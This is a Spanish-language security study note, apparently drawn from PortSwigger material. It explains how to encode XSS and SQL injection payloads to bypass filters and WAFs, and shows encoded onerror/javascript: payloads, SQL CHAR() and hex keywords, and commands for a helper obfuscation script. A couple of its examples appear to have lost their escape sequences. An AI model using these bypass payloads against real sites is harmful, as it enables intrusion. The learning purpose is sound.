---
tags:
  - obfuscation
  - encoding
  - reference
  - filter-bypass
  - waf-bypass
---

# Encodings — ofuscar ataques con codificaciones

Referencia de **cada tipo de encoding** para saltar filtros/WAF, con **qué contexto
lo decodifica** y **para qué objetivo sirve**. El script [obfuscate.py](obfuscate.py)
aplica cualquiera de estos (y en cadena) de forma automática.

> Basado en PortSwigger — [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings).

---

## 🎯 Por objetivo (qué encoding usar y dónde están los payloads)

| Objetivo / escenario | Encodings útiles | Payloads |
|----------------------|------------------|----------|
| **JS con `eval(`${x}`)`** (sink que evalúa string) | `hex \xNN`, `unicode \uNNNN`, `base64`+`atob` | [[js-obfuscation]] §4 |
| **DOM XSS** (sink `innerHTML`/`href`/`location`) | `html-hex`/`html` (en atributo), `unicode`, `url` en `javascript:` | [[xss-obfuscation]] · [[js-obfuscation]] |
| **XSS en atributo HTML** (`onerror=`, `href=`) | **HTML entities** (el parser las decodifica en el valor) | [[html-obfuscation]] §1 |
| **XSS en URI `javascript:`** | **URL encoding** de `()`, + HTML entities, + multiple | [[html-obfuscation]] §5 |
| **SQLi — comillas filtradas** | **hex `0x...`**, **`CHAR()`** | [[sql-obfuscation]] §3 |
| **SQLi — WAF/keywords** | **URL / doble URL**, unicode `%uXXXX`, comentarios | [[sql-obfuscation]] §5 |
| **XXE / XML** | **XML entities `&#xNN;`**, cambio de charset (UTF-16) | [[xxe-obfuscation]] |
| **WAF genérico delante de todo** | **doble URL encoding** (decodifica 1 vez, backend otra) | ↓ §2 |

> [!tip] Regla común
> Un filtro bloquea **caracteres/strings literales**. Elegís un encoding que **el
> filtro no reconoce pero el intérprete final SÍ decodifica** (navegador, motor SQL,
> parser XML). El truco es saber **quién decodifica** en tu contexto.

---

## 1. URL encoding

Cada carácter como `%` + su código hex. El servidor lo decodifica antes de procesar.

```
& = %26      espacio = %20 = +      SELECT = %53%45%4C%45%43%54
[...]/?search=Fish+%26+Chips
```
**Útil para:** meter caracteres reservados en la query string; primer paso frente a
un WAF. `obfuscate.py "SELECT" url`

## 2. Double URL encoding

Se codifica **dos veces** (`%` → `%25`). Sirve cuando **una capa decodifica y otra
capa por detrás decodifica de nuevo** (proxy/WAF decodifica 1 vez, la app otra).

```
<img src=x onerror=alert(1)>
= %253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```
**Útil para:** WAFs que normalizan una sola pasada. `obfuscate.py "<img>" double-url`

## 3. HTML encoding

El parser HTML decodifica entidades **en el valor de un atributo** antes de usarlo.
Mismo carácter, muchas formas equivalentes:

```
&colon;  =  :  =  &#58;  (decimal)  =  &#x3a;  (hex)  =  &#00000058;  (ceros a la izq.)
```
Ejemplo — esconder la `a` de `alert`:
```html
<img src=x onerror="&#x61;lert(1)">
```
**Útil para:** XSS cuando tu input cae en un **atributo** (`onerror`, `href`, `src`).
`obfuscate.py "alert(1)" html-hex`

## 4. XML encoding

Igual sintaxis numérica que HTML (`&#xNN;`), pero el que decodifica es el **parser XML**.
Sirve para colar keywords dentro de un XML (p. ej. una inyección en un valor).

```
&#x53; = S
```
```xml
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
**Útil para:** SQLi/inyección **a través de** XML, XXE. `obfuscate.py "SELECT" xml`

## 5. Unicode escaping

Prefijo `\u` + 4 dígitos hex. En ES6, `\u{...}` admite longitud variable y ceros a la izq.

```
: = :  =  \u{3a}  (ES6)  =  \u{0000003a}  (ceros a la izq.)
```
**Útil para:** ocultar caracteres dentro de **strings/identificadores JS** (sinks que
evalúan, DOM XSS). `obfuscate.py "alert(1)" unicode`

## 6. Hex escaping

Code point en hex prefijado con `\x` (JS, por byte). En **SQL** el literal hex usa `0x`.

```
a = \x61
SELECT = 0x53454c454354      (prefijo 0x para SQL)
```
**Útil para:** strings JS (`eval`, backticks) y valores string en SQL sin comillas.
`obfuscate.py "alert(1)" hex`  ·  `obfuscate.py "alert(1)" hex --special` (solo peligrosos → `alert\x281\x29`)

## 7. Octal escaping

Code point en octal prefijado con `\`.
```
a = \141
```
**Útil para:** contextos JS/regex donde `\xNN` está filtrado pero el octal no.
`obfuscate.py "alert(1)" octal`

## 8. Multiple encodings (por capas)

Aplicar un encoding **encima de otro**: cada capa la deshace un decodificador distinto.

```html
<a href="javascript:alert(1)">Click me</a>
```
1) Unicode escape sobre la `a`:
```html
<a href="javascript:alert(1)">Click me</a>
```
2) HTML entity encoding sobre el `\`:
```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```
**Útil para:** filtros encadenados (HTML→JS). El script encadena en orden — p. ej.
`obfuscate.py "alert(1)" unicode url` aplica unicode y luego URL-encode encima
(cada capa recibe la salida de la anterior).

## 9. SQL `CHAR()`

Construye caracteres desde su code point (decimal o hex `0x`), sin comillas.
```
S = CHAR(83) = CHAR(0x53)
SELECT = CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```
**Útil para:** SQLi cuando **filtran las comillas**. `obfuscate.py "SELECT" sql-char`

---

## 🛠️ Script: `obfuscate.py`

Aplica una lista **ordenada** de encodings (cada uno sobre la salida del anterior).

```bash
python obfuscate.py "alert(1)" hex            # \x61\x6c...
python obfuscate.py "alert(1)" hex url        # hex y luego URL-encode
python obfuscate.py "<img src=x>" double-url  # doble URL
python obfuscate.py "alert(1)" hex --special  # solo caracteres peligrosos
python obfuscate.py "SELECT" sql-char
python obfuscate.py -l                         # lista los encodings
```

Encodings: `url`, `double-url`, `html`, `html-hex`/`xml`, `unicode`, `unicode-es6`,
`hex`, `octal`, `base64`, `sql-char`. Para añadir uno: define la función `str->str`
y regístrala en el dict `ENCODERS`.

---

## Referencias

- PortSwigger — [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- HTML encoder online — <https://emn178.github.io/online-tools/html_encode.html>
- Notas por contexto: [[js-obfuscation]] · [[xss-obfuscation]] · [[sql-obfuscation]] · [[html-obfuscation]] · [[xxe-obfuscation]]
